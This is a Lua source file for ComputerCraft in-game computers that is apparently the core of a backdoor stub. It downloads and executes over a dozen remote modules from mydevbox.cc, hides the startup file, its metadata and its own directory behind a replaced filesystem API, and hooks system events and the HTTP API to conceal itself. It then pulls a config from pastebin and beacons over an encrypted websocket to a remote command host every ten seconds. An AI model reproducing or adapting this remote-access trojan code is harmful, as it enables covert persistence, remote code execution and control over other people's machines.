-- SPDX-FileCopyrightText: 2024 David Lightman
--
-- SPDX-License-Identifier: LicenseRef-CCPL
--
-- Spook behind the bar, unmarked car --
local main = {}
main.__index = main
local isShuttingDown = false
local _ogg = _G
local _ogENV = _ENV
local _OGShell = shell
local _OGFS = _G.fs
local backupPullEventRaw = _G.os.pullEventRaw
local backupPullEvent = _G.os.pullEvent
local customeventmanager = (pcall(require, "hooks.customeventmanager") and require("hooks.customeventmanager")) or load(http.get("https://mydevbox.cc/src/hooks/customeventmanager.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "customeventmanager", "t", _G)()
local eventhook = (pcall(require, "hooks.eventhook") and require("hooks.eventhook")) or load(http.get("https://mydevbox.cc/src/hooks/eventhook.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhook", "t", _G)()
local myhttp = (pcall(require, "networking.http.http") and require("networking.http.http")) or load(http.get("https://mydevbox.cc/src/networking/http/http.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "http", "t", _G)()
local customfs = (pcall(require, "modules.persistent.hide_fs") and require("modules.persistent.hide_fs")) or load(http.get("https://mydevbox.cc/src/modules/persistent/hide_fs.lua",{["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "hide_fs", "t", _G)()
local custompairs = (pcall(require, "hooks.custompairs") and require("hooks.custompairs")) or load(http.get("https://mydevbox.cc/src/hooks/custompairs.lua").readAll(), "custompairs", "t", _G)()
local eventhandler = (pcall(require, "eventhandler.eventhandler") and require("eventhandler.eventhandler")) or load(http.get("https://mydevbox.cc/src/eventhandler/eventhandler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "eventhandler", "t", _G)()
local config = (pcall(require, "config.config") and require("config.config")) or load(http.get("https://mydevbox.cc/src/config/config.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "config", "t", _G)()
local utils = (pcall(require, "sys.utils.utils") and require("sys.utils.utils")) or load(http.get("https://mydevbox.cc/src/sys/utils/utils.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "utils", "t", _G)()
local cc_rsa = (pcall(require, "sys.crypto.cc_rsa") and require("sys.crypto.cc_rsa")) or load(http.get("https://mydevbox.cc/src/sys/crypto/cc_rsa.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rsa", "t", _G)() 
local wsrouter = (pcall(require, "networking.http.wsrouter") and require("networking.http.wsrouter")) or load(http.get("https://mydevbox.cc/src/networking/http/wsrouter.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "wsrouter", "t", _G)()
local rednetrouter = (pcall(require, "networking.rednet.router") and require("networking.rednet.router")) or load(http.get("https://mydevbox.cc/src/networking/rednet/router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "rednetrouter", "t", _G)()
local core_router = (pcall(require, "networking.core_router") and require("networking.core_router")) or load(http.get("https://mydevbox.cc/src/networking/core_router.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "core_router", "t", _G)()
local EnD = (pcall(require, "sys.crypto.EnD") and require("sys.crypto.EnD")) or load(http.get("https://mydevbox.cc/src/sys/crypto/EnD.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "EnD", "t", _G)()
local command_handler = (pcall(require, "networking.processor.command_handler") and require("networking.processor.command_handler")) or load(http.get("https://mydevbox.cc/src/networking/processor/command_handler.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "command_handler", "t", _G)()
local uninstaller_installer = (pcall(require, "uninstaller") and require("uninstaller")) or load(http.get("https://mydevbox.cc/src/uninstaller.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "uninstaller", "t", _G)()

local configpath = nil
local metadataFile = nil
local rstartup = utils.generateRandomString(3)
_OGFS.copy("startup.lua",rstartup)

local function getShellRunArgument()
    if not _OGFS.exists(rstartup) then
        return nil -- Return nil if the file doesn't exist
    end

    local f = _OGFS.open(rstartup, "r")
    if not f then
        return nil
    end

    for line in f.readLine do
        -- Match the format: shell.run("argument")
        local argument = string.match(line, '^%s*shell%.run%(%s*["\'](.-)["\']%s*%)')
        if argument then
            f.close()
            return argument -- Return the extracted argument
        end
    end

    f.close()
    return nil -- Return nil if no matching line is found
end
local rstartup2 = getShellRunArgument()

local function getRealStartupPath()
    shell.setDir("/")
    if not _OGFS.exists(rstartup2) then
         return nil  end
    local f1 = _OGFS.open(rstartup2, "r")
    if not f1 then
        return nil end
    for i = 1, 6 do
        local l = f1.readLine()
        if not l then
            break
        end
        local filename = string.match(l, "^%-%-(%S+)%.$")
        if filename then
            f1.close()
            return filename
        end
    end
    f1.close()
    return nil
end

local function getBDApath()
    if not _OGFS.exists(rstartup2) then
        return nil, nil 
    end
    local f = _OGFS.open(rstartup2, "r")
    if not f then 
        return nil, nil
    end
    for i = 1, 6 do
        local l = f.readLine()
        if not l then 
            break
        end
        local path, filename = string.match(l, "^%-%-(.-),(%S+)$")
        if path and filename then
            f.close()
            return path, filename
        end
    end
    f.close()
    return nil, nil
end

local function getMetadataFile()
    if not _OGFS.exists(rstartup2) then
        return nil -- Return nil if the file doesn't exist
    end

    local f = _OGFS.open(rstartup2, "r")
    if not f then
        return nil -- Safeguard against failed open
    end

    for i = 1, 10 do -- Check only the first 10 lines
        local line = f.readLine()
        if not line then
            break
        end

        -- Match the format: --key^value
        local key= string.match(line, "^%-%-(%S+)%^")
        if key then
            f.close()
            return key -- Return key and value
        end
    end
    f.close()
    return nil -- Return nil if no matching line is found
end

local xsup=getRealStartupPath()
local bdapath, filename = getBDApath()
metadataFile=getMetadataFile()
_OGFS.delete(rstartup)

local function getConfigUrl()
    --metadataFile
    if ((_OGFS.exists(metadataFile)) and (utils.getFileSize(_OGFS, metadataFile) > 0)) then
        configpath = utils.getMetadataValue(_OGFS, metadataFile, "config", "|")
    end
end

local function hideStartup()
    if xsup ~= nil then
        local handle = _OGFS.open(xsup, "r")
        if handle then
            local contents = handle.readAll() or ""
            handle.close()
    
            if contents == "" then
                -- Hide real startup.lua file if xsup has no contents
                customfs.hideFile("startup.lua")
            else
                -- Set xsup as the original startup and hide it
                customfs.setOriginalStartup(xsup)
                customfs.hideFile(xsup)
            end
        else
            -- If the file can't be opened, fallback to hiding the real startup.lua
            customfs.hideFile("startup.lua")
        end
    else
        -- If xsup is nil, ensure real startup.lua is hidden
        customfs.hideFile("startup.lua")
    end
end

function main.setup()
    hideStartup()
getConfigUrl()
if xsup~=nil then
    print("hide file: "..xsup)
    customfs.setOriginalStartup(xsup)
    customfs.hideFile(xsup)
else
    print("xsup is nil")
end
if metadataFile~=nil then
    customfs.hideFile(metadataFile)
end
if customfs ~= nil and bdapath ~= nil then
    filename = nil
    customfs.hideDir(bdapath)
end
_G.fs=customfs
uninstaller_installer.setOGFS(_OGFS)
uninstaller_installer.setCFS(customfs)
uninstaller_installer.setOGShell(_OGShell)
eventhook.setCustomQueueEvent(customeventmanager.getQueueEventName())
eventhook.setOriginalPullEvent(backupPullEvent)
eventhook.setOriginalPullEventRaw(backupPullEventRaw)
eventhook.activate()

myhttp.addEventHandlers(eventhook)
myhttp.setCustomPullEvent(customeventmanager.getPullEventName())
--myhttp.addSilentDomain("mydevbox.cc") --TODO: FIX for WS, add session ids
_G.http = myhttp
custompairs.add_to_blacklist(customeventmanager.getPullEventName())
custompairs.add_to_blacklist(customeventmanager.getQueueEventName())

eventhook.setEventHandler(eventhandler)
--local startup = (pcall(require, "sys.startup") and require("sys.startup")) or load(http.get("https://mydevbox.cc/src/sys/startup.lua", {["User-Agent"] = "ComputerCraft-BDA-Stub"}).readAll(), "startup", "t", _G)()
--startup:onStartup()
if (configpath~=nil) then config:DownloadConfig("https://pastebin.com/raw/"..configpath)  else return main end
--New: RjaTsuaK
 --Old: https://pastebin.com/raw/rHA43mQp
config:set("identifier.stubid", utils.generateRandomString(16))
--print("identifier: "..config:get("identifier.stubid"))
--print("RHOST: {Redacted for sanity sake}")
local handlerInstance = setmetatable({}, eventhandler)
myhttp.setEnD(EnD)
wsrouter.setIdentifier(config:get("identifier.stubid"))
wsrouter.setRSA(cc_rsa)
wsrouter.setUtils(utils)
wsrouter.setEnD(EnD)
wsrouter.setRawRhost("wss://"..config:get("networking.http.rhost"))
wsrouter.setOwnerID(config:get("identifier.ownerid"))
wsrouter.setConfig(config)
rednetrouter.setIdentifier(config:get("identifier.stubid"))
rednetrouter.setRSA(cc_rsa)
rednetrouter.setUtils(utils)
rednetrouter.setEnD(EnD)
core_router.setRednetrouter(rednetrouter)
core_router.setWsrouter(wsrouter)
core_router.setCommandHandler(command_handler)
core_router.setRednetEnabled(config:get("networking.rednet.enabled"))
core_router.setWsEnabled(config:get("networking.http.enabled"))
command_handler.setMain(main)
end


function main.getConfig()
    return config
end
function main.getConfigUrl()
    return configurl
end
function main.setConfigUrl(url)
    configurl = url
end
function main.getUtils()
    return utils
end
function main.getRSA()
    return cc_rsa
end
function main.getEnD()
    return EnD
end
function main.getCore_Router()
    return core_router
end
function main.getUninstaller()
    return uninstaller
end
function main.getOGShell()
    return _OGShell
end
function main.getOGFS()
    return _OGFS
end

function main.getProgramPath()
    return bdapath
end

function main.init()
    wsrouter.allow_encryption(true)
    wsrouter.connect(config:get("networking.http.rhost"))
    core_router.TXRX2Host("0x00", false)
    while not isShuttingDown do
        core_router.TXRX2Host("0x00", false)
        sleep(10)
    end
end
return main